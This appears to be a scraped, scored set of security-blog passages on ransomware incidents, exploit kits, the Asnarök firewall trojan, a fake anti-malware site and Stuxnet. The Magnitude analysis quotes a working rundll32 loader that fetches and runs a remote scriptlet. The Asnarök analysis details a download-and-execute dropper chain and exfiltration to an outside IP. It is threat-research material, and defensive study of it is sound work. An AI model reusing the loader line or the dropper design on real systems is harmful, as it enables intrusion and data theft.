In this case, the Rapid Response team discovered vulnerable versions of Citrix software on customer systems. Although it is unclear what vulnerability was exploited, the installed Citrix Storefront 7.15 CU3 was vulnerable at time of incident to 1 Critical (CVE-2019-11634) and 4 High rated CVE vulnerabilities (CVE-2019-13608, CVE-2020-8269, CVE-2020-8270, CVE-2020-8283) which may have been exploited in order to gain initial access to the target network.",0.021929487437837847
"Once in, the threat actor also used Remote Desktop Protocol (RDP) logins to maintain access to the initial admin account used in the attack. On the network, the threat actor used Mimikatz, which allows the threat actors to reveal the credentials stored on the system, to compromise a domain admin account.
The Rapid Response investigation uncovered PowerShell commands as well as the use of RDP and Cobalt Strike to move laterally to multiple hosts, conduct reconnaissance, and enumerate the network.
The threat actor installed the file transfer and synchronization application MEGA in order to exfiltrate data.",0.01460927714110738
"The Nefilim ransomware binaries were deployed using Windows Management Instrumentation (WMI) via the compromised domain admin account.
Checklist for secure account access management",0.013625331614210534
"Only grant the access permissions needed for a specific task or role
Disable accounts no longer needed
If you need to keep an account active after the original owner has left the organization, implement a service account and deny interactive logins
Carry out regular audits of Active Directory: Active Directory Audit Policies can be set to monitor for admin account activity or if an unexpected account is added to the domain admin group
Have a robust security solution in place, ideally with anti-ransomware technologies such as that featured in Intercept X",0.011000078203545205
"If you are experiencing an active incident and need immediate response, contact Sophos Rapid Response. For details of our 24/7 Managed Threat Response (MTR) service, visit our website or speak with your Sophos representative.",0.02167809233375073
"Special thanks to David Anderson, Peter Mackenzie, Sergio Bestulic, and Bill Kearney for their efforts in detecting, investigating, and responding to these threats.",0.01603750404891746
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Magnitude exploit kit switches to GandCrab ransomware
The GandCrab ransomware is reaching far and wide via malspam, social engineering schemes, and exploit kit campaigns. On April 16, we discovered that Magnitude EK, which had been loyal to its own Magniber ransomware, was now being leveraged to push out GandCrab, too.
While Magnitude EK remains focused on targeting South Koreans, we were able to infect an English version of Windows by replaying a previously recorded infection capture. This is an interesting departure from Magniber, which was extremely thorough at avoiding other geolocations.
Magnitude is now also using a fileless technique to load the ransomware payload, making it somewhat harder to intercept and detect. The variations of this technique have been known for several years and used by other families such as by Poweliks, but they are a new addition to Magnitude.",0.014064297027534867
"Figure 1: Magnitude EK traffic capture with the GandCrab payload
Magnitude has always experimented with unconventional ways to load its malware, for example via binary padding, or more recently via another technique, but still exposing it “in the clear” from traffic or network packet capture.",0.017890954764462674
"Figure 2: Magnitude EK dropping Magniber on April 4, 2018
The payload is encoded (using VBScript.Encode/JScript.Encode) and embedded in a scriplet that is later decoded in memory and executed.
""C:\Windows\System32\rundll32.exe"" javascript:""\..\mshtml,RunHTMLApplication "";
document.write();GetObject('script:http://dx30z30a4t11l7be.lieslow[.]faith/5aad4b91a0da20d4faab0991bdbe7138')",0.012484877790854276
"Figure 3: Innocuous scriptlet hides the payload
After the payload is injected into explorer.exe, it immediately attempts to reboot the machine. If we suspend that process and use @hasherezade‘s PE-Sieve, we can actually dump the GandCrab DLL from memory:",0.01086970694294398
"Figure 4: Extracting the payload from memory using PE-Sieve
Upon successful infection, files will be encrypted with the .CRAB extension while a ransom note is left with instructions on the next steps required to recover those files.",0.014034897759971021
"Figure 5: GandCrab’s ransom note
A recent law enforcement operation provided victims with a way to recover their files from previous GandCrab infections. However, the latest version cannot be decrypted at the moment.
Malwarebytes users are protected against this attack when either the Internet Explorer (CVE-2016-0189) or Flash Player (CVE-2018-4878) exploits are fired.
Time will tell if Magnitude sticks to GandCrab, but this is a noteworthy change for an exploit kit that solely used its own Magniber ransomware for about 7 months, after having replaced the trusted Cerber.
Indicators of compromise
Dumped GandCrab DLL
9daf74238f0f7d0e64f8bb046c136d7e61346b4c084a0c46e174a2b76f30b57a
",0.015201287780243211
“Asnarök” Trojan targets firewalls,0.00850508075435552
Customized malware used to compromise physical and virtual firewalls,0.007723561010705593
"Written by
Sophos",0.008109740279453215
"April 26, 2020",0.008901353511780896
SophosLabs Uncut Threat Research Asnarok ELF Firewall malware shell script,0.008526156502628113
"Editor’s note (2020-04-30): As we learn more from our ongoing investigation, we will issue updates at the end of this article.
As we described last week in this KBA, Sophos and its customers were the victims of a coordinated attack by an unknown adversary. This attack revealed a previously unknown SQL injection vulnerability that led to remote code execution on some of our firewall products. As described in the KBA, the vulnerability has since been remediated.
This post is the result of many hours of research and reverse-engineering by SophosLabs and Sophos internal security teams, working in conjunction with product management to coordinate a hotfix and global response within two days of discovering this attack. In the spirit of transparency, we want to describe the nature of the attack and a detailed analysis of the malware based on our investigation and current understanding.
There was significant orchestration involved in the execution of the attack, using a chain of Linux shell scripts that eventually downloaded ELF binary executable malware compiled for a firewall operating system. This attack targeted Sophos products and apparently was intended to steal sensitive information from the firewall.
How the attack began
The infection process started when an attacker discovered, and exploited, a zero-day SQL injection remote code execution vulnerability. The exploit of this vulnerability resulted in the attacker being able to insert a one-line command into a database table.",0.010020615899735574
"This initial injected command triggered an affected device to download a Linux shell script named Install.sh from a remote server on the malicious domain sophosfirewallupdate[.]com. The command also wrote this shell script to the /tmp directory on the device, used the chmod program to designate the file as executable, and executed it.
The script (written to the appliance as x.sh) ran a series of SQL commands and dropped additional files into the virtual file system to lay the groundwork for the rest of the attack.
The Install.sh script, initially, ran a number of Postgres SQL commands to modify or zero out the values of certain tables in the database, one of which normally displays the administrative IP address of the device itself. It appears that this was an attempt to conceal the attack, but it backfired: On some appliances, the shell script’s activity resulted in the attacker’s own injected SQL command line being displayed on the user interface of the firewall’s administrative panel. In place of what should have been an address, it showed a line of shell commands.",0.008373333834889696
"This script also dropped at least two other shell scripts into the /tmp directory, and modified at least one shell script that is part of the firewall’s operating system to add a set of commands to the end of the script. This last script, in particular, is relevant because the malware modified services to ensure it ran every time the firewall booted up; it served as a roundabout persistence mechanism for the malware.",0.010995591624472278
"The three shell ELF game
The installer script, x.sh, dropped two completely new shell scripts, and modified an existing script that is part of the operating system.
One of the dropped shell scripts was named .lp.sh and its primary function was to connect to the malicious sophosfirewallupdate site, and download a Linux ELF executable file compiled to run on the firewall operating system named lp. The script wrote that downloaded file to /tmp with a filename of just b.",0.012122999852894
"The b program, when run, deleted itself from the filesystem of the device, so it was only present in memory. It appeared in the process list as a program whose name, cssconf.bin, is one character off from a legitimate process that normally runs on a firewall, cscconf.bin. The highlighted process list below shows the malicious program as it would have appeared running on an infected firewall. It is also notable that it listed its parent process ID as 1, which the legitimate cscconf.bin would never have done.",0.011167928071752042
"While b was in memory, it repeated a series of tasks every 3 to 6 hours — a delay interval chosen at random the first time it ran, and reused thereafter.
First, b checked to see if it could make a connection to a machine with the IP address of 43.229.55.44. If the ELF couldn’t make a connection to that IP address, it attempted to resolve the IP address for the malicious domain sophosproductupdate[.]com.",0.011577479301069449
"If it resolved the IP for that domain, and DNS did not return a value of 127.0.0.1 as a result, then it downloaded another Linux ELF executable called Sophos.dat, which we’ll discuss in the next section.
Shell script number two dropped by the Install.sh/x.sh script was written to the /tmp directory with a filename of .pg.sh. Its main purpose was to download a second, different ELF executable, which was called bk on the webserver and was written to the filesystem with the name .post_MI.
Earlier we mentioned that Install.sh, the first stage dropper, ran a number of Postgres SQL commands. One of these commands modified a specific service value entry so that .post_MI executed whenever that service executed; this provided persistence by starting the malware at every reboot.
This executable had limited functionality: It checked to see whether a file named .a.PGSQL (more on this in a minute) had been written to the /tmp directory, and if it didn’t find it, it attempted to download a shell script from the web server hosted at ragnarokfromasgard.com, called patch.sh. At the time we performed the analysis of the attack, this server wasn’t responding.",0.012735615348762552
"The third shell script is a modification of a shell script that is already part of the firewall’s internal operating system, named generate_curl_ca_bundle.sh. The Install.sh/x.sh script made a backup copy of the original (prepending a dot to the filename, .generate_curl_ca_bundle.sh) before it modified the original script to append code to the file. That code wrote out and dropped yet another shell script, /tmp/I (just a capital letter i).
The I script had two primary functions. First, it performed a “touch” of the /tmp/.a.PGSQL file (an act that, if the file did not exist, created it in the /tmp directory). The previously-mentioned .post_MI ELF executable checked to see if .a.PGSQL existed as part of its execution.
The I script then retrieved a shell script file named lc from the sophosfirewallupdate domain, and wrote that to the /tmp directory as .n.sh and executed it. This script replicated the same behavior as the .lp.sh script (mentioned above), and attempted to download and execute the b ELF executable from the malicious sophosfirewallupdate website. This download of b was the persistence mechanism, given that the b process deleted itself off disk as one of its first actions.
Data exfiltration process
Note: This section describes our understanding of the data exfiltration capabilities of the malware at the time of publication of this article, but we have not discovered any evidence that the data collected had been successfully exfiltrated.
The steps involving the shell scripts and ELF binary executables apparently were done in order to bring the attack to the point where the malware downloaded and executed a file that had been named Sophos.dat on the remote server, saved to the filesystem as 2own.",0.013104046135551606
"This malware’s primary task appeared to be data theft, which it could perform by retrieving the contents of various database tables stored in the firewall, as well as by running some operating system commands. At each step, the malware collected information and then concatenated it to a file it stored temporarily on the firewall with the name Info.xg.
First, the binary attempted to retrieve the public-facing IP address where the firewall was installed. It did this first by querying the website ifconfig.me, and if that site was not reachable for some reason, it tried to do the same by contacting checkip.dyndns.org.
Next, it queried a number of data storage areas on the firewall to retrieve information about the firewall and its users.
This diagram below shows the capability of the malware to exfiltrate data.  As of the date of publication, we have not discovered any evidence that the data collected had been successfully exfiltrated.",0.012633023745465488
"The malware demonstrated the capability to retrieve only firewall resident information, which may have included:",0.007994924693974559
"The firewall’s license and serial number
A list of the email addresses of user accounts that were stored on the device, followed by the primary email belonging to the firewall’s administrator account
Firewall users’ names, usernames, the encrypted form of the passwords, and the salted SHA256 hash of the administrator account’s password. Passwords were not stored in plain text.
A list of the user IDs permitted to use the firewall for SSL VPN and accounts that were permitted to use a “clientless” VPN connection.",0.009784232771489876
"The malware then queried an internal database of the firewall to retrieve a list of the IP address allocation permissions for the users of the firewall, as well as information about the appliance itself: What version of the operating system was running, what type of CPU and amount of memory was present on the device; how long it had been operational since the last reboot (the ‘uptime’); and the output of the ifconfig and ARP tables.",0.011568003741828314
"Once the malware wrote all this information to Info.xg, it then compressed it using the tar compression tool, and then used OpenSSL to encrypt the archive file. The attacker used the Triple-DES algorithm to encrypt the file, and for a pass phrase, the word “GUCCI” in all capital letters. The malware then intended to upload the encrypted file to a machine at the IP address 38.27.99.69, and then cleaned up its tracks by deleting the files temporarily created while it collected the information.",0.012394272560791841
"Remediation and response
Files associated with this attack have been added to the definition Linux/Agnt-G and domains and IP addresses have been flagged as malicious in the SophosXL domain reputation service.
A hotfix update has already been released to Sophos customers to patch the vulnerability used by the attackers to access the firewalls. If you don’t have automatic updates enabled on the firewall, please follow these instructions to enable them.
Since the attack was discovered, Sophos has taken a number of steps, which we can summarize as follows: SophosLabs blocked domains found in initial forensic analysis of the attack, and later identified and blocked additional domains and IP addresses associated with the attack. We notified customers about mitigation steps. We issued a telemetry update to firewalls; and we designed, developed, and tested a hotfix to mitigate the SQL injection and this attack, and then pushed the hotfix to supported devices. Sophos also has submitted a request for a CVE, and will add the CVE number to the knowledge base article once available. We have also taken additional actions that fall outside the scope of this article.
There are a few steps Sophos customers can take to harden their environments and remediate an affected firewall appliance. These steps are kept up to date and outlined in the Sophos knowledge base entry on this issue.
Updated information
2020-04-30:",0.011383659637124621
"We’ve since received a report that network activity to the 38[.]27[.]99[.]69 server was observed from multiple targeted firewalls during the attack. Again, we urge customers with impacted firewalls to reset passwords and to follow the remediation instructions contained in KBA135412.
In addition to the SHA-256 form, an MD5 hash of the admin password was also stored on the firewall for the purposes of backward compatibility. A recently-issued hotfix to the firewall removed the additional hash.",0.0076630239595126826
Indicators of Compromise (IoCs),0.020564823014395883
File indicators,0.007303470655304123
"File Name
SHA256
FileType
Functionality",0.008552252095467172
"Install.sh [/tmp/x.sh]
736da16da96222d3dfbb864376cafd58239344b536c75841805c661f220072e5
Bash
Main install script. Compromised firewall settings, dropped two files and modified a third.",0.010615088063978262
Shell script,0.007352349819490178
"lc [/tmp/.n.sh]
a226c6a641291ef2916118b048d508554afe0966974c5ca241619e8a375b8c6b
Bash
Downloaded lp (ELF dropper)",0.011225701940812738
Shell script,0.007352349819490178
"bk [/var/newdb/global/.post_MI]
4de3258ebba1ef3638642a011020a004b4cd4dbe8cd42613e24edf37e6cf9d71
ELF
Downloaded patch.sh",0.007955854421154096
X86 binary,0.007478362720933607
"lp [/tmp/b]
9650563aa660ccbfd91c0efc2318cf98bfe9092b4a2abcd98c7fc44aad265fda
ELF
Main dropper. Downloaded 2own (data exfiltration) module",0.01399180610302253
X86 binary,0.007478362720933607
"in.s_h
8e9965c2bb0964fde7c1aa0e8b5d74158e37443d857fc227c1883aa74858e985
Bash
Slightly modified form of install.sh",0.008848857044714387
Shell script,0.007352349819490178
"2own
31e43ecd203860ba208c668a0e881a260ceb24cb1025262d42e03209aed77fe4
ELF
Data theft module. Exfiltrates to 38.27.99.69",0.011770504361782064
X86 script,0.007041815624543424
"Network indicators
URLs
hxxps://sophosfirewallupdate.com/sp/Install.sh
hxxp://sophosfirewallupdate.com/sh_guard/lc
hxxps://sophosfirewallupdate.com/bk
hxxps://sophosfirewallupdate.com/sp/lp
hxxps://ragnarokfromasgard.com/sp/patch.sh
hxxps://sophosfirewallupdate.com/sp/sophos.dat
hxxps://sophosfirewallupdate.com/in_exit
hxxps://sophosfirewallupdate.com/sp/lpin
hxxp://sophosfirewallupdate.com/bkin
hxxp://filedownloaderservers.com/bkin
hxxps://sophosfirewallupdate.com/sp/p.sh
hxxps://sophosfirewallupdate.com/sp/ae.sh
Domains
sophosfirewallupdate.com
filedownloaderservers.com
ragnarokfromasgard.com
sophosenterprisecenter.com
sophoswarehouse.com
sophosproductupdate.com
sophostraining.org
Additional suspicious domains
filedownloaderserverx.com
filedownloaderserver.com
updatefileservercross.com
IPs
43.229.55.44
38.27.99.69
Filesystem paths
/tmp/x.sh
/var/newdb/global/.post_MI
/scripts/vpn/ipsec/generate_curl_ca_bundle.sh (modified)
/scripts/vpn/ipsec/.generate_curl_ca_bundle.sh (original)
/tmp/I
/tmp/.a.PGSQL
/tmp/.n.sh
/tmp/.pg.sh
/tmp/.lp.sh
/tmp/b
/tmp/2own
/tmp/Info.xg
/tmp/%s_.xg.rel
/tmp/%s_.xg.salt
/tmp/ip (result of http://checkip.dyndns.org/ip_dyn)
/tmp/ip_dyn (result of https://ifconfig.me/ip)",0.015145441026278683
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"27
",0.015290189037560964
"Malwarebiter – Biting down on you
UPDATE: As of 1/28, the Facebook page for Malwarebiter appears to have been deleted.
Overview
A few days ago Malwarebytes Intelligence Analyst Adam Kujawa released a Cyber-Threat Advisory on a fairly new anti-malware product on the web called “Malwarebiter”.  This product grabbed our attention because of its similar name to Malwarebytes.  After taking a look at the two products, it’s easy to instantly notice similarities between the two, below are just a few:",0.010243885404118025
Name:,0.008256872640899915
Malwarebytes,0.008523446878171748
Malwarebiter,0.008305646130284616
Slogan:,0.006766618627613297
“Taking the Byte out of Malware”,0.010592096997714906
“Bite down on Malware”,0.008243748608089407
Price:,0.008548032867400579
$24.95,0.007626830695267595
$24.95,0.007626830695267595
Website:,0.007871849054758684
Blue theme,0.00910024399518028
Blue theme,0.00910024399518028
"Various reports on the web suggest this advertised anti-malware product has been around since at least May 2012, while its Facebook page appears to have been created just last month.  Facebook users will notice the software claims to have received an award for being the “World’s Best Anti-Malware Software”.
Malwarebiter Facebook Page",0.011078262663849148
"Furthermore, its Facebook page has some 26,000 likes, a rather high number for only being a month old but not completely unrealistic.  Since Facebook keeps record of users talking about topics and stores the data, our team looked at Malwarebiter discussions on the social media giant.  The results were interesting.  Here is a graph showing the history of users talking about Malwarebiter on Facebook.  Our company’s data is provided to the left just to show our readers what a typical graph might look like.
Facebook showing strange community data on Malwarebiter",0.015471067211317746
"As seen from the Malwarebiter graph, the number of people talking about the product started at nearly 45,000 on 12/21/2012, and then flat-lined to a mere 28 the next day.  These sharp differences are highly indicative of spamming and perhaps other forms of foul-play.  Considering these facts, our analyst team decided to visit the company’s site and see what the alleged “world’s best” protection looked like.  Their entire site took us less than a minute to navigate and doesn’t have a lot to see, only an apparent rip-off of our company’s product.  Afterward, we took a look at data captured from our visit.
Malwarebiter.com – Behind the scenes
Traffic analysis from our visit revealed “roe.js”, a file containing javascript.  Upon further inspection the file revealed an embedded iFrame object that links to a rogue IP hosting the Blackhole Exploit Kit, a somewhat funny outcome to visiting a supposed anti-malware site.
roe.js – Malicous javascript file",0.014079453144421938
"In case our readers aren’t familiar with iFrames, these allow web developers to embed the contents of one webpage within another.  Using iFrames for drive-by malware attacks is common since they can be crafted invisible to the naked eye.  Malicous iFrames often redirect users to malware URLS unbeknownst to them, as seen frequently in Blackhole, Crimepack, and other exploit kits.
The “roe.js” file seen in the image executes either a java or PDF exploit, which downloads a malicious payload to the visitor’s PC.   The java exploit has been identified as CVE-2013-0422, posted recently as a CTA in our Unpacked blog, and the PDF exploit was identified as the notorious libtiff integer overflow as seen in CVE-2010-0188.  In addition, a malicious file is served to visitors after the exploit; this was identified by our intel team as the infamous Zeus botnet after observing packets from the malware making requests for “gate.php”.
Java Exploit:
Java Exploit (CVE-2013-0422)",0.011025985833179264
"PDF Exploit:
PDF Exploit (CVE-2010-0188)",0.013055806045255802
"Malicious payload (Zeus):
Downloads and executes Zeus bot",0.007364108410345183
"It’s clear based on the evidence that malwarebiter.com is delivering web exploits to its visitors and spreading the popular Zeus botnet.  After viewing the product’s website, our team decided to head over to the downloads page and check out the Malwarebiter scanner.
Malwarebiter – Scanner Review
The installation is pretty straightforward and doesn’t raise a lot of flags.  After installing and skipping through some annoying dialogs, you’ll arrive at the program’s main screen.  Our analysts ran a “Smart Scan” to see if it found anything on the host.  As predicted, the software doesn’t appear to find anything too relevant, including our newly acquired Zeus bots.  Here is what it did find:",0.01298267702528244
"Various cookies
A CoolWebSearch false positive
The WinPcap Dll",0.005969145392935582
"The file wpcap.dll is for WinPcap and is required to run Wireshark on Windows.  Some scanners pick up this file because it’s argued that it could be used for malicious purposes.  However, the other detection of “CoolWebSearch” is entirely a False Positive.  Malwarebiter states that the registry value “Tries to lock you out of certain parts of your computer so that you cannot remove malicious software.”  Whenever you report a false positive through the program’s interface, it asks for additional info, and then requests data from www.ad-purge.com.  Ad-purge is reported as a fake spyware remover and has a very similar interface to Malwarebiter.
Comparison of Ad-purge and Malwarebiter interface, displaying many similarities.",0.01234446729916927
"Malwarebiter also has a button to update its definitions database, but to our surprise it doesn’t even require an active internet connection (it is the world’s best, after all).  The following network request was observed when updating the program’s definitions.
Malwarebiter program contacts rebrandsoftware.com domain",0.01168924525449866
"When visiting rebrandsoftware.com our intel analysts found they create software products to sell to private buyers, who in-turn resell the product as if it were their own (thereby “rebranding” it).  Below is a statement from their site.
Description of rebrandsoftware from website",0.015269217454003892
"Interestingly, Malwarebiter and Ad-Purge both contact rebrandsoftware.com, and numerous pieces of malware have also been discovered contacting this domain.  At face-value it appears that Malwarebiter and Ad-purge are both fake programs developed by this vendor.  In addition, this isn’t the first time Malwarebytes has had issues with this domain, so we would caution our readers before considering the use of any software from this supplier.
Conclusion
It’s vital to protect yourself from software exploitation at all angles, as detailed in a recent Unpacked article by Jerome Segura.  Protection from these exploits will prevent further infection from malware to your PC.  The java and PDF exploits found on Malwarebiter’s website could be prevented by keeping your software patched and up to date.  However, this doesn’t always solve the problem, as both Java and PDF viewers are highly-targeted for exploitation, with new vulnerabilities discovered every day.  In light of this, users might want to stop using java altogether, at least in conjunction with less-secure web browsers, like Internet Explorer.  As for protection from malicious PDFs, there are alternatives to Adobe’s reader that exist, such as Foxit, but this product still has its own vulnerabilities. Users might be better off viewing their PDF documents in secure browsers, like Google Chrome.
Also, it’s imperative for our readers to understand the greater danger posed from Malwarebiter and other scams like it (and there are plenty).  These fake programs put users at an even higher risk of infection as they offer virtually no protection.  Even worse, some alleged security products infect your PC with malware when installed, or in this case, simply visiting the product’s website.
PC users should consider carefully before making the choice on Antivirus/anti-malware software.   Here are some tips when choosing reliable solutions.",0.01502134252337628
"Choose a product that’s well-known in the Computer Security industry.
NEVER pay for a product until you try it.
Be wary of products that make bold claims without quantifying data to back it up.
Verify that detected malware is in fact malware.",0.017155444456784186
"If you’re looking for a place to start, here at Malwarebytes we offer Malwarebytes Anti-Malware (MBAM) in a free version.  MBAM is updated multiple times daily and offers the latest in cutting-edge malware detection.  Head over to our product comparison page for more information.
Thanks to Adam Kujawa, Jerome Segura, and Steven Burn for additional research material and input.
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques.  His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.014266655087174951
"A few facts about Win32/Stuxnet & CVE‑2010‑2568
We realize there have been a lot of articles in the blog now about the Win32/Stuxnet malware and its new vector for spreading, but when vulnerabilities emerge that can be widely exploited, it is important to share information so that people can protect themselves from the threat. Detection for Win32/Stuxnet and the shortcut (LNK) files",0.01309850706307747
22 Jul 2010 - 05:36PM,0.011858267320289273
"We realize there have been a lot of articles in the blog now about the Win32/Stuxnet malware and its new vector for spreading, but when vulnerabilities emerge that can be widely exploited, it is important to share information so that people can protect themselves from the threat. Detection for Win32/Stuxnet and the shortcut (LNK) files",0.01334286804205198
"We realize there have been a lot of articles in the blog now about the Win32/Stuxnet malware and its new vector for spreading, but when vulnerabilities emerge that can be widely exploited, it is important to share information so that people can protect themselves from the threat.",0.014128641520939844
"Detection for Win32/Stuxnet and the shortcut (LNK) files used to spread it were initially added in virus signature database update 5282, which was released on Thursday, July 15, 2010. The shortcuts used to initially spread this malware are reported as LNK/Autostart.A trojan by ESET. On Tuesday, July 20, 2010, an additional form of heuristic detection was added for shortcuts containing the vulnerability, which are detected as LNK/Exploit.CVE-2010-2568. So, protection has been available for this threat for almost a week.",0.012033712511586803
"On Saturday, July 17, 2010, ESET Senior Researcher Pierre-Marc Bureau reported that a new device driver for the Win32/Stuxnet worm digitally signed with a code-signing certificate belonging to “JMicron Technology Corp.“. At the time of the report, it was unclear whether this was a new certificate which had been fraudulently obtained or was a legitimate certificate that had been stolen. ESET’s virus lab has since confirmed this digital certificate is the same one used by JMicron to sign device drivers in their JMB 36x Host Controller Drivers R1.17.55 package, which means the certificate was, in fact stolen. A screen shot of the certificate from this package:",0.013150127232180453
The serial number for this digital certificate is “47 6f 49 f4 c9 59 f6 56 e9 aa 1e b8 7f c5 29 bb.”  VeriSign reports here in their blog that they have revoked both this digital certificate and the earlier one used by RealTek to prevent further misuse by malware authors.,0.01270270796749895
"We have received several questions about the number of Win32/Stuxnet infection attempts, as reported to us by customers through ThreatSense.NET, ESET’s telemetry system. To date, that number remains miniscule, accounting for just a few hundredths of a percent of the types of malware we receive reports about on a daily basis. Those infections, though, have an unusual geographic spread. At the time of this writing the top countries are:  the United States, Iran, Russia, Indonesia and the Faroe Islands*, with the rest of the world accounting for the remaining of infections. Please note that geographic data like this from our virus lab can change in just a few minutes, which is why the country list may appear slightly different than previous reports.",0.013932441843393817
"Aryeh Goretsky, MVP, ZCSE
Distinguished Researcher",0.009562063253802378
"*We were surprised by the number of reports received from the Faroe Islands and thought this might be an error. It was verified, and a special thanks to David Harley for his investigation into the economy of the Faroes.
",0.01185946135244631
Up2Date 7.404 Released,0.007793524469488666
"Astaro has made available Up2Date 7.404 via our global content distribution system. Your Astaro Gateway Products should shortly be downloading and preparing it for install. This is an incremental release designed to strengthen the security and stability of your product. For the full details, read on!",0.009607584950174775
"Written by
Angelo Comazzetto",0.008855311348334505
"July 08, 2009",0.00894913796030683
Network up2date,0.007611986957109407
"Astaro has made available Up2Date 7.404 via our global content distribution system. Your Astaro Gateway Products should shortly be downloading and preparing it for install. This is an incremental release designed to strengthen the security and stability of your product. For the full details, read on!",0.009607584950174775
"This Up2Date package is mainly being released to address a published security concern regarding IPsec, which we will patch against. In addition, a few small adjustments are being made which address some issues.
Up2Date 7.404 Details
Remarks:",0.009959947504219802
"Existing configuration will not be changed
This package will be auto-downloaded and made ready for installation
NOTE: *System will be rebooted*",0.009053688603975263
News:,0.00891099266407347
"Fixed IPsec vulnerability CVE-2009-2185
In regards to the new features and benefits of AxG 7.4, please read the V7.4 Release Notes PDF.",0.013089248461957026
"Fixes:
Fix [10588]: Connecting via DHCP / Cable modem may fail
Fix [10607]: Issue with reconnecting to DSL via PPPoE
Fix [10633]: Fixed error messages in ipsec.log ""Conntrack failed""
Download Information:
Astaro Main FTP
Size: 9155683bytes (8.7 Megabytes)
Md5sum: ed5765c8b79580998be966a1022f5cda
The Astaro Up2Date technology makes it easy to upgrade your installed Astaro Security Gateway to the latest version. There are two ways to apply an Up2Date package to the system:",0.010577874573659551
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on then Watch Up2Date Progress in new window and an extra browser window will show the progress of the Up2Date installation and the System administrator will receive a notification email once the Up2Date process has finished successfully.
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:
Astaro AxG Up2Date Download Mirrors:
– Astaro US
– Astaro US2
– Astaro Germany
– Astaro Germany2
(All Up2Dates are GNUPG-signed!)",0.01152530673320118
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the AxG V7 features you should post it on our User Bulletin Board. Please take care to add always(!) the version you refer to (e.g. ""[7.403] WAN Link Balancing "").
If you have feedback to our documentation (Online Help) please send it to docu@astaro.com.
There is also a demo server: http://demo.astaro.com",0.012543893761853386
– The Astaro Team,0.009457225465590358
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Top Adult Site RedTube Compromised, Redirects to Malware
DISCLAIMER: THIS POST INCLUDES SOME LANGUAGE AND TOPICS THAT MIGHT NOT BE SUITABLE FOR ALL READERS, PLEASE BE ADVISED AND PROCEED WITH CAUTION.",0.02135343536616774
"Update 2/18/15:
RedTube has confirmed the incident and said they addressed the hack:",0.010577880204491352
"The continuing proliferation of malware attacks have made them a concern for any organization. This past Sunday, leading provider of adult content RedTube was exposed to an attack for a brief period of time. Our security systems immediately detected the breach and we took direct action to rectify the situation in order to protect RedTube users. The situation was fully resolved by Sunday evening and there is no longer any risk to visiting RedTube.",0.011225026967203622
"Redtube pursues stringent privacy requirements and maintains the highest industry standards of privacy protection to secure not only their assets and properties, but to provide comprehensive protection of their customers’ data when visiting a Redtube owned site. Redtube is committed to providing their customers with an optimal  online experience and the  peace of mind when they are accessing a RedTube site.",0.01961284569205879
"As always we urge people to still use caution and keep their computers protected.
Original Story:
We’ve documented adult sites leading to malware before on this blog, but this one is a little bit different.
This time around, the source of the problem is not malvertising, but rather a malicious iframe placed directly in the source code of redtube[dot]com, a pornographic site that boasts over 300 million visits a month.
Overview",0.009578549710501094
"iframes
The attack doesn’t come from a malicious advertisement being loaded on the webpage, like was the case with xHamster, but rather the source code of RedTubes main page was modified to include a hidden piece of redirection code.
The code is executed inside of an iFrame, which is basically like a browser window inside of your browser window that can point to any website the attacker wants. In this case the iFrame is set to be completely invisible to the user and navigates to the following malicious URLs:
hxxp://tfx.pw/a.js
hxxp://fuck.fpmenziken.ch/adShowMe.jsp?zoneid=27&bannerid=2&chid=341aa8fca26bcff7830499c1c5f8e359
This slideshow requires JavaScript.
The existence of the iFrame in the main page source code is evidence enough to say that RedTube servers were likely hacked by malicious actors who had access to the main page source code, adding the malicious code and then setting it loose on RedTube users.
Exploit Kit (Angler EK)
The Angler Exploit Kit has been one of the more prominent exploit kits on the cyber black market for the last year, being used in zero day attacks against applications like Flash and Silverlight.  It’s instance in this case doesn’t use a zero day exploit, however it’s ability to quickly and effectively infect a user with malware is what makes it so popular among cybercriminals. The pages directly involved with the exploit kit are as follows:
hxxp://replenisht-dyletantyzm.latinbrothersmusic.com/io5h8d19i3.php
hxxp://replenisht-dyletantyzm.latinbrothersmusic.com/9E4aI_T3BSf0HXpKG_1f-gNLcItlXc8fnVsgRFGib8jC_hw-ySQKzEHvsQP08slM
hxxp://replenisht-dyletantyzm.latinbrothersmusic.com/XaN63jVCo9-NC1KsRn7nfMKIXpGreKpqo8UDRna5HHoBKjrIcRWibrIW1Av8mk4K
Angler EK uses the more recently discovered Flash Exploit CVE-2015-0313 (Zero-Day) and once it exploits the user’s browser, will attempt to drop malware detected by Malwarebytes Anti-Malware as Trojan.FakeMS.Ed.  Other security vendors detect the malware as belonging to the Kazy Trojan family.
This family is known for stealing personal information from users as well as installing browser helper objects that spread pop-up ads, some redirecting to additional exploit pages and therefore more malware infections.
Anti-Exploit protection",0.01229440056678155
"Malwarebytes Anti-Exploit proactively detects and blocks the exploit before it gets the chance to download and run malware.
Exploit infections, either through drive-by methods, malvertisement or malicious iFrame injections have been a problem for users and organizations alike for years and rather than it slowing down, new discoveries in attach technology has only increased the amount of attacks happening every month.
It is then highly advised that looking into anti-exploit, malicious webpage blocking and advertisement blocking solutions is in the best interest of all users.
",0.015329596139347035
"A Week in Security (Aug 02 – Aug 08)
Last week, we saw a fake Android alert that blames Chinese hackers, a peculiar Facebook phishing campaign that is after your government-approved ID, a “Payment Confirmation” spam that is actually carrying malware—about which we analyzed in-depth on a separate blog post—and a blatant copying and pasting of exploit code from the Hacking Team data leak by Chinese hackers into their own exploit files.
We also spotted and documented a huge malvavertising campaign that may have affected users and visitors of Yahoo!. The attackers had leveraged on Microsoft Azure websites to house the malicious scripts. Jérôme Segura, the senior security researchers responsible for this discovery wrote, “We did not collect the payload in this particular campaign although we know that Angler has been dropping a mix of ad fraud (Bedep) and ransomware (Cryptowall).”
